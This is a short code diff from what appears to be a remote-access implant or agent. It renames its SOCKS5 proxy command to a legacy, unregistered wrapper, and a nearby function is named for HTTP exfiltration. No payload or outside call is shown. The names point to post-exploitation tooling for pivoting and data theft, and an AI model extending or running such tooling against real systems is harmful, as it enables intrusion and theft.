@@ -2078,13 +2078,16 @@ def _exfil_http(conn, args: list[str]) -> str:
 
 
 # ---------------------------------------------------------------------------
-# SOCKS5 proxy server on the agent
+# SOCKS5 proxy server on the agent  (first implementation — legacy, kept for
+# _launch_socks5_server; the canonical @_register("socks5") is defined later)
 # ---------------------------------------------------------------------------
 
 _socks5_servers: dict[int, object] = {}   # port → server socket
 
-@_register("socks5")
-def _socks5_start(conn, args: list[str]) -> str:
+# NOTE: @_register("socks5") is NOT placed here; the full RFC-1928 compliant
+# implementation below (line ~2832) is the authoritative registration.
+def _socks5_start_legacy(conn, args: list[str]) -> str:
+    """Legacy wrapper kept for internal use; not directly registered."""
     port = int(args[0]) if args and args[0].isdigit() else 1080
     if port in _socks5_servers:
         return f"[-] SOCKS5 already running on port {port}"
